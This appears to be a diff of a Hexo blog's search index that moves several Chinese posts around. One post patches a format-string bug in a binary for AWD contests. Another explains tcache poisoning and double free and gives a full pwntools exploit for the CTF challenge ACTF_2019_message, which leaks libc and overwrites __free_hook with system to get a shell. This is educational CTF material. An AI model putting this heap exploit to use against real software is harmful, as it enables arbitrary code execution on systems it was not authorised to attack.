@@ -19,37 +19,52 @@
 ]]></content>
   </entry>
   <entry>
-    <title>AWD</title>
-    <url>/2023/06/21/awd/</url>
-    <content><![CDATA[<p>本篇主要讲的是相对于pwn来说比较基础的awd攻防对抗的几种类型，比如对溢出漏洞，格式化字符串漏洞，整数溢出漏洞，数组索引越界漏洞，以及跟堆有关的UAF漏洞的修复。</p>
-<p>在了解这些之前呢首先你的掌握对IDA的最基本的使用以及汇编代码的基本了解</p>
-<h1 id="格式化字符串漏洞："><a href="#格式化字符串漏洞：" class="headerlink" title="格式化字符串漏洞："></a>格式化字符串漏洞：</h1><p>直接来个最简单的例子</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">// gcc fmt.c -o fmt -no-pie -w</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char b[100];</span><br><span class="line">    scanf(&quot;%s&quot;, b);</span><br><span class="line">    printf(b);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+    <title>tcache-poisoning-doublefree</title>
+    <url>/2023/07/07/tcache-poisoning-doublefree/</url>
+    <content><![CDATA[<h1 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h1><p>主要的利用手段是覆盖tcache中的next成员变量，由于tcache_get()函数没有对next进行检查，所以理论上来讲如果我们将next中的地址进行替换，不需要伪造任何chunk结构即可实现malloc到任何地址，简单来说就是将堆的fd指针修改为”__free_hook”，执行我们想要的比如system；</p>
+<h1 id="doublefree"><a href="#doublefree" class="headerlink" title="doublefree"></a>doublefree</h1><p>其实就是同一个指针free两次。虽然一般把它叫做double free。其实只要是free一个指向堆内存的指针都有可能产生可以利用的漏洞；</p>
+<p>接下来我将主要演示一下在做题时doublefree的表示（包含tcache poisoning）：</p>
+<p>以下纯属作者个人的理解</p>
+<p>咱们的目的主要是想让程序执行我们准备的恶意堆块，那应该怎么做呢，很显然就得利用到doublefree了，举个例子</p>
+<p>申请一个0x60（假设为堆块A）的堆块，连续free两次时会出现：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
 
-<p>当我们运行该代码时<img src="/2023/06/21/awd/2.png" alt="2"></p>
-<p>当我们正常输入时，可以看到并没有什么问题，可是当我们输入格式化字符串%s时却出现了一些奇怪的输出，</p>
-<p>这是因为我们在printf函数上并没有规定b的输出格式，从而导致了内存泄漏的问题。解决方法呢，思路也很简单</p>
-<p>就是再给printf函数添加一个%s不就行了嘛，可是要怎么添加呢，直接加上去肯定不现实，因为比赛时人家肯定不会给你C语言源代码，这时候我们就要想到人家给你的文件进行反汇编修改，这时候就要用到IDA一个插件keypatch<img src="/2023/06/21/awd/3.png" alt="3"></p>
-<p>然后找到我们要修改的函数<img src="/2023/06/21/awd/4.png" alt="4"></p>
-<p>先确定我们的思路就是将printf(b);修改为printf(“%s”,b);所以我们要将printf函数的第一个参数修改%s,第二个参数修改为b;</p>
-<p>但是这里我们就要注意几个问题：</p>
-<p>1.我们在修改一个地方的时候别的地方会不会改变；</p>
-<p>2.在没有%s的情况下怎么办；</p>
-<p>3.最重要的还是如何修改；</p>
-<p>首先呢，第一个问题，肯定是会变的，因此我们要将变化的这一段重新放回到一个地方进行修改，可问题是在哪里修改呢，得在一个有执行权限的地方<img src="/2023/06/21/awd/5.png" alt="5"></p>
-<p>在gdb中调试可知道0x400000~0x401000是由可执行权限的<img src="/2023/06/21/awd/6.png" alt="6">因此我们可以jmp到0x4006b9的地方来部署我们的汇编。</p>
-<p>接下来解决第二个问题，如何增加%s，我们可以在rodata段进行二进制修改<img src="/2023/06/21/awd/7.png" alt="7"></p>
-<p>将0x4006b1和0x4006b2的地方将0和2修改为%和s（前提是这里没有被利用）查询%和s的ascll码分别为25和73<img src="/2023/06/21/awd/8.png" alt="8"></p>
-<p>那么第三个问题自然就简单了，思路为先跳转到.eh_frame_hdr，在将%s传入rdi,b传入rsi,再跳转到刚才的代码中</p>
-<p>那么汇编代码就是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jmp 0x4006b9            //最后要nop一下</span><br><span class="line">lea rax,[rbp-0x70]             //fomat</span><br><span class="line">mov rsi,rax</span><br><span class="line">lea rdi,[0x4006b1]             //%s</span><br><span class="line">jmp 0x4005fd</span><br></pre></td></tr></table></figure>
 
-<p>最后呢要在这里应用一下才有效哦<img src="/2023/06/21/awd/9.png" alt="9"></p>
-<p>然后我们保存文件再来gdb调试一下<img src="/2023/06/21/awd/10.png" alt="10"></p>
-<p>可以看到已经成功地修改我们运行测试一下<img src="/2023/06/21/awd/12.png" alt="12"></p>
-<p>可以看到该程序的输出已经正常。</p>
-<p>可是呢该程序是没有开启pie保护的，如果开启了pie保护呢，那我们在jmp的时候地址岂不是不确定了，但是我在开启pie式的时候发现按照上面的地址方式（开了pie时成了偏移）照样行得通。</p>
-<p>先写这么多吧。</p>
+
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/1.png"></p>
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/2.png"></p>
+<p>可以看到堆块A的fd指针指向了堆块A，可是这有什么用呢，当然有用，这时候我们可以在申请一个同样大小的堆块B，这个堆块我们可以控制，这也就代表我们控制了堆块A的fd指针的指向…..假设我们在堆块B中写入free hook的地址</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/3.png"></p>
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/4.png"></p>
+<p>可以看到这个时候堆块A的fd指针已经指向了堆块B，那么这个时候我们再把堆块A申请出来就可以了，再将freehook指针指向比如system这样就达到了我的目的。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/5.png" alt="add(堆块A)"></p>
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/6.png" alt="add(加入system)"></p>
+<p>可以看到freehook的指针已经指向system,这样就成功调用了system</p>
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/7.png" alt="system的地址"></p>
+<p>接下看来以[ACTF_2019_message]为例</p>
+<h1 id="ACTF-2019-message"><a href="#ACTF-2019-message" class="headerlink" title="ACTF_2019_message"></a>ACTF_2019_message</h1><p>题目源文件</p>
+<p>[链接：<a href="https://pan.baidu.com/s/1anJ1ufkBKnFU9aaa5-qT4A">https://pan.baidu.com/s/1anJ1ufkBKnFU9aaa5-qT4A</a>  </p>
+<p>提取码：chen]:</p>
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/8.png"></p>
+<p>一个菜单题，有输入和输出，经过检查不存在UAF。</p>
+<p>查看保护：</p>
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/9.png"></p>
+<p>没有开PIE，RELRO全部开启。</p>
+<p>题目中没有给libc库（很难受），本人以18.04的ubuntu用tcache poisoning + doublefree的方法解决的（远端估计打不通），使用的libc版本为libs&#x2F;2.27-3ubuntu1_amd64&#x2F;libc-2.27.so</p>
+<p>由于题比较简单，不作一一解释</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./actf&quot;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,25689)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./actf&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#debug(p,0x00000000400A92)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,message</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;message:\n&#x27;</span> , <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;message:\n&#x27;</span> , message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;delete:\n&#x27;</span> , <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,message</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;edit:\n&#x27;</span> , <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;message:\n&#x27;</span> , message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;display:\n&#x27;</span> , <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x800</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#1    #unsortedbin</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x800</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)<span class="comment">#3  #unsortedbin</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bbbbbbbb&quot;</span>)</span><br><span class="line">leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="comment">#print(hex(leak))</span></span><br><span class="line">libc_base=leak-<span class="number">0x3ebca0</span></span><br><span class="line">free = libc_base+<span class="number">0x3ed8e8</span></span><br><span class="line">system = libc_base + <span class="number">0x4f440</span></span><br><span class="line"><span class="comment">#system = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment">#free = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
+    <title>1-plus</title>
+    <url>/2023/04/27/1-plus/</url>
+    <content><![CDATA[<p>第二次的第一次</p>
+<p><img src="/2023/04/27/1-plus/q.jpg" alt="steam"></p>
 ]]></content>
   </entry>
   <entry>
@@ -95,52 +110,37 @@
 ]]></content>
   </entry>
   <entry>
-    <title>1-plus</title>
-    <url>/2023/04/27/1-plus/</url>
-    <content><![CDATA[<p>第二次的第一次</p>
-<p><img src="/2023/04/27/1-plus/q.jpg" alt="steam"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>tcache-poisoning-doublefree</title>
-    <url>/2023/07/07/tcache-poisoning-doublefree/</url>
-    <content><![CDATA[<h1 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h1><p>主要的利用手段是覆盖tcache中的next成员变量，由于tcache_get()函数没有对next进行检查，所以理论上来讲如果我们将next中的地址进行替换，不需要伪造任何chunk结构即可实现malloc到任何地址，简单来说就是将堆的fd指针修改为”__free_hook”，执行我们想要的比如system；</p>
-<h1 id="doublefree"><a href="#doublefree" class="headerlink" title="doublefree"></a>doublefree</h1><p>其实就是同一个指针free两次。虽然一般把它叫做double free。其实只要是free一个指向堆内存的指针都有可能产生可以利用的漏洞；</p>
-<p>接下来我将主要演示一下在做题时doublefree的表示（包含tcache poisoning）：</p>
-<p>以下纯属作者个人的理解</p>
-<p>咱们的目的主要是想让程序执行我们准备的恶意堆块，那应该怎么做呢，很显然就得利用到doublefree了，举个例子</p>
-<p>申请一个0x60（假设为堆块A）的堆块，连续free两次时会出现：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+    <title>AWD</title>
+    <url>/2023/06/21/awd/</url>
+    <content><![CDATA[<p>本篇主要讲的是相对于pwn来说比较基础的awd攻防对抗的几种类型，比如对溢出漏洞，格式化字符串漏洞，整数溢出漏洞，数组索引越界漏洞，以及跟堆有关的UAF漏洞的修复。</p>
+<p>在了解这些之前呢首先你的掌握对IDA的最基本的使用以及汇编代码的基本了解</p>
+<h1 id="格式化字符串漏洞："><a href="#格式化字符串漏洞：" class="headerlink" title="格式化字符串漏洞："></a>格式化字符串漏洞：</h1><p>直接来个最简单的例子</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">// gcc fmt.c -o fmt -no-pie -w</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char b[100];</span><br><span class="line">    scanf(&quot;%s&quot;, b);</span><br><span class="line">    printf(b);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
+<p>当我们运行该代码时<img src="/2023/06/21/awd/2.png" alt="2"></p>
+<p>当我们正常输入时，可以看到并没有什么问题，可是当我们输入格式化字符串%s时却出现了一些奇怪的输出，</p>
+<p>这是因为我们在printf函数上并没有规定b的输出格式，从而导致了内存泄漏的问题。解决方法呢，思路也很简单</p>
+<p>就是再给printf函数添加一个%s不就行了嘛，可是要怎么添加呢，直接加上去肯定不现实，因为比赛时人家肯定不会给你C语言源代码，这时候我们就要想到人家给你的文件进行反汇编修改，这时候就要用到IDA一个插件keypatch<img src="/2023/06/21/awd/3.png" alt="3"></p>
+<p>然后找到我们要修改的函数<img src="/2023/06/21/awd/4.png" alt="4"></p>
+<p>先确定我们的思路就是将printf(b);修改为printf(“%s”,b);所以我们要将printf函数的第一个参数修改%s,第二个参数修改为b;</p>
+<p>但是这里我们就要注意几个问题：</p>
+<p>1.我们在修改一个地方的时候别的地方会不会改变；</p>
+<p>2.在没有%s的情况下怎么办；</p>
+<p>3.最重要的还是如何修改；</p>
+<p>首先呢，第一个问题，肯定是会变的，因此我们要将变化的这一段重新放回到一个地方进行修改，可问题是在哪里修改呢，得在一个有执行权限的地方<img src="/2023/06/21/awd/5.png" alt="5"></p>
+<p>在gdb中调试可知道0x400000~0x401000是由可执行权限的<img src="/2023/06/21/awd/6.png" alt="6">因此我们可以jmp到0x4006b9的地方来部署我们的汇编。</p>
+<p>接下来解决第二个问题，如何增加%s，我们可以在rodata段进行二进制修改<img src="/2023/06/21/awd/7.png" alt="7"></p>
+<p>将0x4006b1和0x4006b2的地方将0和2修改为%和s（前提是这里没有被利用）查询%和s的ascll码分别为25和73<img src="/2023/06/21/awd/8.png" alt="8"></p>
+<p>那么第三个问题自然就简单了，思路为先跳转到.eh_frame_hdr，在将%s传入rdi,b传入rsi,再跳转到刚才的代码中</p>
+<p>那么汇编代码就是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jmp 0x4006b9            //最后要nop一下</span><br><span class="line">lea rax,[rbp-0x70]             //fomat</span><br><span class="line">mov rsi,rax</span><br><span class="line">lea rdi,[0x4006b1]             //%s</span><br><span class="line">jmp 0x4005fd</span><br></pre></td></tr></table></figure>
 
-
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/1.png"></p>
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/2.png"></p>
-<p>可以看到堆块A的fd指针指向了堆块A，可是这有什么用呢，当然有用，这时候我们可以在申请一个同样大小的堆块B，这个堆块我们可以控制，这也就代表我们控制了堆块A的fd指针的指向…..假设我们在堆块B中写入free hook的地址</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free))</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/3.png"></p>
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/4.png"></p>
-<p>可以看到这个时候堆块A的fd指针已经指向了堆块B，那么这个时候我们再把堆块A申请出来就可以了，再将freehook指针指向比如system这样就达到了我的目的。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/5.png" alt="add(堆块A)"></p>
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/6.png" alt="add(加入system)"></p>
-<p>可以看到freehook的指针已经指向system,这样就成功调用了system</p>
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/7.png" alt="system的地址"></p>
-<p>接下看来以[ACTF_2019_message]为例</p>
-<h1 id="ACTF-2019-message"><a href="#ACTF-2019-message" class="headerlink" title="ACTF_2019_message"></a>ACTF_2019_message</h1><p>题目源文件</p>
-<p>[链接：<a href="https://pan.baidu.com/s/1anJ1ufkBKnFU9aaa5-qT4A">https://pan.baidu.com/s/1anJ1ufkBKnFU9aaa5-qT4A</a>  </p>
-<p>提取码：chen]:</p>
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/8.png"></p>
-<p>一个菜单题，有输入和输出，经过检查不存在UAF。</p>
-<p>查看保护：</p>
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/9.png"></p>
-<p>没有开PIE，RELRO全部开启。</p>
-<p>题目中没有给libc库（很难受），本人以18.04的ubuntu用tcache poisoning + doublefree的方法解决的（远端估计打不通），使用的libc版本为libs&#x2F;2.27-3ubuntu1_amd64&#x2F;libc-2.27.so</p>
-<p>由于题比较简单，不作一一解释</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./actf&quot;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,25689)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./actf&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#debug(p,0x00000000400A92)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,message</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;message:\n&#x27;</span> , <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;message:\n&#x27;</span> , message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;delete:\n&#x27;</span> , <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,message</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;edit:\n&#x27;</span> , <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;message:\n&#x27;</span> , message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;display:\n&#x27;</span> , <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x800</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#1    #unsortedbin</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x800</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)<span class="comment">#3  #unsortedbin</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bbbbbbbb&quot;</span>)</span><br><span class="line">leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="comment">#print(hex(leak))</span></span><br><span class="line">libc_base=leak-<span class="number">0x3ebca0</span></span><br><span class="line">free = libc_base+<span class="number">0x3ed8e8</span></span><br><span class="line">system = libc_base + <span class="number">0x4f440</span></span><br><span class="line"><span class="comment">#system = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment">#free = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
+<p>最后呢要在这里应用一下才有效哦<img src="/2023/06/21/awd/9.png" alt="9"></p>
+<p>然后我们保存文件再来gdb调试一下<img src="/2023/06/21/awd/10.png" alt="10"></p>
+<p>可以看到已经成功地修改我们运行测试一下<img src="/2023/06/21/awd/12.png" alt="12"></p>
+<p>可以看到该程序的输出已经正常。</p>
+<p>可是呢该程序是没有开启pie保护的，如果开启了pie保护呢，那我们在jmp的时候地址岂不是不确定了，但是我在开启pie式的时候发现按照上面的地址方式（开了pie时成了偏移）照样行得通。</p>
+<p>先写这么多吧。</p>
 ]]></content>
   </entry>
   <entry>
